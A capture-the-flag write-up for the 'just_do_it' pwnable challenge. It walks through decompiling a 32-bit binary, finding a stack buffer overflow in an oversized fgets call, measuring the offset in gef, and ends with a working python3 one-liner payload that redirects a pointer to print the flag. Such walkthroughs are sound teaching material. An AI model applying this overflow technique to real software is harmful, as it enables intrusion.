# just_do_it

Some basic file enumeration

```s
$ file just_do_it 
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
$ pwn checksec --file just_do_it 
[*] 'just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Putting the application into Ghidra and looking at the main function

```c

undefined4 main(undefined param_1)

{
  char *flag_contents;
  int iVar1;
  char user_input [16];
  FILE *flag_fh;
  char *output_msg;
  undefined1 *local_c;
  
  local_c = &param_1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  output_msg = "Invalid Password, Try Again!";
  flag_fh = fopen("flag.txt","r");
  if (flag_fh == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  flag_contents = fgets(flag,48,flag_fh);
  if (flag_contents == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  flag_contents = fgets(user_input,32,stdin);
  if (flag_contents == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = strcmp(user_input,"P@SSW0RD");
  if (iVar1 == 0) {
    output_msg = "Correct Password, Welcome!";
  }
  puts(output_msg);
  return 0;
}


```

Obviously the password is a string literal of `P@SSW0RD` but getting `Correct Password, Welcome!` is not the objective of this challenge. 

There is a mismatch in sizes for the `user_input` variable. `user_input` is allocated 16 bytes on the stack. However, 32 bytes are allowed to be read into the `user_input` variable causing an overflow. 

Since the objective is to get the flag, an atacker can actually overwrite the `output_msg` variable to point to where to flag points to in memory. 

First, find the offset from `user_input` and `output_msg`:

```
...
   0x080486f1 <+310>:   sub    esp,0xc
   0x080486f4 <+313>:   push   DWORD PTR [ebp-0xc] <---- ebp-0xc is the pointer to the actual string literal
   0x080486f7 <+316>:   call   0x8048460 <puts@plt>
   0x080486fc <+321>:   add    esp,0x10
   0x080486ff <+324>:   mov    eax,0x0
...
gef➤  x/xw $ebp-0xc
0xffffcd1c:     0x61616166
gef➤  pattern offset $ebp-0xc
[+] Searching for '$ebp-0xc'
[+] Found at offset 20 (little-endian search) likely
[+] Found at offset 17 (big-endian search) 
gef➤ 
```

Now you need the address of where the flag is written to in memory.

```
   0x0804864b <+144>:   push   DWORD PTR [ebp-0x10] 
   0x0804864e <+147>:   push   0x30
   0x08048650 <+149>:   push   0x804a080  <----- stack address which'll contain the flag
   0x08048655 <+154>:   call   0x8048440 <fgets@plt>
   0x0804865a <+159>:   add    esp,0x10
   0x0804865d <+162>:   test   eax,eax
gef➤  x/s 0x804a080
0x804a080 <flag>:       "TWCTF{pwnable_warmup_I_did_it!}\n"
```

Now overwrite ebp-0xc with the address of what you want to print out. You can do this using pwntools or in a python3 one-liner.

`python3 -c "import sys;sys.stdout.buffer.write(b'A' * 20 + b'\x80\xa0\x04\x08')" | ./just_do_it`